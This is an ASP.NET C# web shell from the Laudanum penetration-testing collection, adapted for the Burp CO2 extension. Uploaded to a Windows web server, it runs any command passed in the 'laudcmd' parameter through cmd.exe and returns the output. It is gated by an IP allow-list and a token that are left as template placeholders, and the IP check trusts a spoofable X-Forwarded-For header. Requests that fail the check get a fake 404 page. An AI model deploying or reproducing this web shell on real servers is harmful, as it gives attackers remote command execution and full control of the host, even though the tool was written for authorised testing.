<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">

/* *****************************************************************************
***
*** Burp-Laudanum
***
*** This is a Burp CO2 adoptation of similar functionality defined in the
*** Laudanum project.
***
*** CO2: www.burpco2.com
***
*** Burp-Laudanum Author:
***         Jason Gillam <jgillam@secureideas.com>
***
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net>
***         Tim Medin <tim@counterhack.com>
***
*** Copyright 2013 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides shell access to the system.
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */

string stdout = "";
string stderr = "";
string cmd = "";
string cwd = "";
string token = "";

void die() {
	//HttpContext.Current.Response.Clear();
	HttpContext.Current.Response.StatusCode = 404;
	HttpContext.Current.Response.StatusDescription = "Not Found";
	HttpContext.Current.Response.Write("<h1>404 Not Found</h1> ");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}

void denied() {
	HttpContext.Current.Response.StatusCode = 403;
	HttpContext.Current.Response.StatusDescription = "Forbidden";
	HttpContext.Current.Response.Write("<h1>403 Forbidden</h1>");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}

void Page_Load(object sender, System.EventArgs e) {

	token = Request["laudtoken"];
	cmd = Request["laudcmd"];

	// Check for an IP in the range we want
	string[] allowedIps = new string[] {"::1",${LAUD.IPS}};

	// check if the X-Fordarded-For header exits
	string remoteIp;
	if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
		remoteIp = Request.UserHostAddress;
	} else {
		remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0];
	}

	bool validIp = false;
	foreach (string ip in allowedIps) {
		validIp = (validIp || (remoteIp == ip));
	}

	if (!validIp) {
		die();
	}

	if (token != "${LAUD.TOKEN}") {
		denied();
	}

	cwd = Request["laudcwd"];
	if (cwd == null || cwd == "" || cwd == "."){
		cwd = Directory.GetCurrentDirectory();
	} else {
		cwd = Server.UrlDecode(cwd);
	}

	if (cmd != null) {
		cmd = Server.UrlDecode(cmd);

		if (cmd.StartsWith("cd ")) {
			string newpath = cmd.Substring(3);
			if (Directory.Exists(newpath)){
				cwd = newpath;
				stdout = "(Laudanum: cd succeeded)";
			} else if (Directory.Exists(cwd + "\\" + newpath)){
				cwd = cwd + newpath;
				stdout = "(Laudanum: cd succeeded)";
			} else {
				stderr = "Error: Folder does not exist.";
			}

		} else {

	// do or do not, there is no try
	//try {
		// create the ProcessStartInfo using "cmd" as the program to be run, and "/c " as the parameters.
		// "/c" tells cmd that we want it to execute the command that follows, and exit.
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);

		if (Directory.Exists(cwd)) {
			procStartInfo.WorkingDirectory = cwd;
		}

		// The following commands are needed to redirect the standard output and standard error.
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.RedirectStandardError = true;
		procStartInfo.UseShellExecute = false;
		// Do not create the black window.
		procStartInfo.CreateNoWindow = true;
		// Now we create a process, assign its ProcessStartInfo and start it
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		// Get the output and error into a string
		stdout = p.StandardOutput.ReadToEnd();
		stderr = p.StandardError.ReadToEnd();
	//}
	//catch (Exception objException)
	//{
		}
	}
}
</script>
&stdout=<%=Server.UrlEncode(stdout)%>&stderr=<%=Server.UrlEncode(stderr)%>&cwd=<%=Server.UrlEncode(cwd)%>&